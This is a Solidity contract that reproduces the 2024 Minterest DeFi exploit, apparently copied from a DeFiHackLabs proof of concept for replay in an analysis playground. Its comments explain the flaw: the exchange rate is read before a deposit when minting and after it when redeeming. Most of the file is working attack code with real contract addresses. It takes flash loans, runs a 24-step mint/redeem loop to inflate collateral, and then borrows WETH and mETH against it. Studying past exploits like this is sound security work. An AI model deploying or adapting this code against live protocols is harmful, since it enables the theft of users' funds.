// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-07-Minterest).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (`Exploit is Test`): the outer USDY flash-loan callback lands on the test's
// `fallback()`, which dispatches to `myFunction`, whose own ERC-3156 flash-loan
// callback (`onFlashLoan`) does the wrap/lend/redeem loop. There is no standalone
// attack contract to deploy, so this is a faithful, self-contained copy of that
// inline attack, compiled inside the registry forge project so the playground can
// deploy it and record `run()`. Logic and constants are copied verbatim from
// test/Minterest_exp.sol.
//
// Root cause: Minterest's mUSDY market (`lendRUSDY`) snapshots the exchange rate
// BEFORE the deposit's cash is added, while the generic `redeemUnderlying` (via
// `redeemFresh`) recomputes the rate AFTER that cash is already counted. Because
// `exchangeRate = (cash + totalBorrows - protocolInterest) / totalTokenSupply`,
// a large self-funded deposit moves the rate between the two reads: mint at the
// low pre-deposit rate (more mUSDY), redeem at the high post-deposit rate (fewer
// mUSDY burned). Looping this 24 times inflates mUSDY collateral for free, which
// the Supervisor then lets the attacker borrow real WETH/mETH against.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IERC3156FlashBorrower {
    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32);
}

// The mUSDY market (Minterest Compound-fork MToken + rUSDY-aware overrides).
interface Musdy is IERC20 {
    function maxFlashLoan(address token) external view returns (uint256);
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool);
    function redeemUnderlying(uint256 redeemAmount) external;
    function lendRUSDY(uint256 _rUsdyLendAmount) external;
}

// The rUSDY wrapper (Ondo rUSDYW): wrap(USDY) -> rUSDY.
interface Musd is IERC20 {
    function wrap(uint256 _USDYAmount) external;
}

// mWETH / mMETH borrow markets.
interface Meth is IERC20 {
    function borrow(uint256 _amount) external;
}

contract MinterestDrain {
    // vulncontract: the USDY-denominated flash pool that bootstraps the attack
    // with a single large ERC-3156-style `flash()` call.
    address constant VULN_FLASH_POOL = 0xe38E3a804eF845e36F277D86Fb2b24b8C32B3340;
    Musdy constant musdy = Musdy(0x5edBD8808F48Ffc9e6D4c0D6845e0A0B4711FD5c);
    Musd constant musd = Musd(0xab575258d37EaA5C8956EfABe71F4eE8F6397cF3);
    Meth constant mWETH = Meth(0xfa1444aC7917d6B96Cac8307E97ED9c862E387Be);
    Meth constant mMETH = Meth(0x5aA322875a7c089c1dB8aE67b6fC5AbD11cf653d);
    IERC20 constant WETH = IERC20(0xdEAddEaDdeadDEadDEADDEAddEADDEAddead1111);
    IERC20 constant mETH = IERC20(0xcDA86A272531e8640cD7F1a92c01839911B90bb0);
    IERC20 constant usdy = IERC20(0x5bE26527e817998A7206475496fDE1E68957c5A6);
    address constant PROXY = 0xe53a90EFd263363993A3B41Aa29f7DaBde1a932D;

    bytes4 private constant TARGET_FUNCTION_SELECTOR = 0x847d282d;
    uint256 public wrapAmount;

    // Entry point: approve, enable mUSDY as collateral, then trigger the outer
    // USDY flash loan that bootstraps the wrap/lend/redeem loop via fallback().
    function run() external {
        usdy.approve(address(musdy), type(uint256).max);
        usdy.approve(address(musd), type(uint256).max);
        musd.approve(address(musdy), type(uint256).max);
        musdy.approve(address(musdy), type(uint256).max);

        address[] memory addressArray = new address[](1);
        addressArray[0] = address(musdy);
        PROXY.call(abi.encodeWithSignature("enableAsCollateral(address[])", addressArray));

        // Outer bootstrap flash: pool transfers USDY to us, then calls back our
        // fallback() with selector 0x847d282d (its own ERC-3156-flavored callback
        // convention), which dispatches into the 24-loop below.
        VULN_FLASH_POOL.call(
            abi.encodeWithSelector(bytes4(0x490e6cbc), address(this), 0, 4_265_391_252_891_663_973_703_824, "")
        );

        mWETH.borrow(223 ether);
        mMETH.borrow(204 ether);
    }

    // The 24-iteration loop: each iteration takes an mUSDY-market ERC-3156 flash
    // loan of USDY (whatever the market currently holds), which triggers
    // onFlashLoan() to wrap -> lendRUSDY (mints at the LOW pre-deposit rate), then
    // immediately redeemUnderlying (burns at the HIGH post-deposit rate) — netting
    // free mUSDY collateral every loop.
    function myFunction(uint256, uint256, uint256) public {
        uint256 i = 0;
        wrapAmount = 4_265_037_756_531_702_250_012_049;
        while (i < 24) {
            uint256 amount = musdy.maxFlashLoan(address(usdy));
            musdy.flashLoan(IERC3156FlashBorrower(address(this)), address(usdy), amount, "");
            musdy.redeemUnderlying(4_265_817_792_016_953_140_101_195);
            i++;
        }
        usdy.transfer(msg.sender, 4_265_817_792_016_953_140_101_195);
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        musd.wrap(wrapAmount);
        wrapAmount -= 383_885_212_760_249_758;
        uint256 thisAmount = musd.balanceOf(address(this));
        // ⚠️ vulnerable call: mints mUSDY at the pre-deposit exchange rate.
        musdy.lendRUSDY(thisAmount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    fallback() external payable {
        require(msg.data.length >= 4, "Invalid data");
        bytes4 selector;
        assembly {
            selector := calldataload(0)
        }
        if (selector == TARGET_FUNCTION_SELECTOR) {
            uint256 varg0;
            uint256 varg1;
            uint256 varg2;
            assembly {
                varg0 := calldataload(4)
                varg1 := calldataload(36)
                varg2 := calldataload(68)
            }
            myFunction(varg0, varg1, varg2);
        } else {
            revert("Function not recognized");
        }
    }

    receive() external payable {}
}
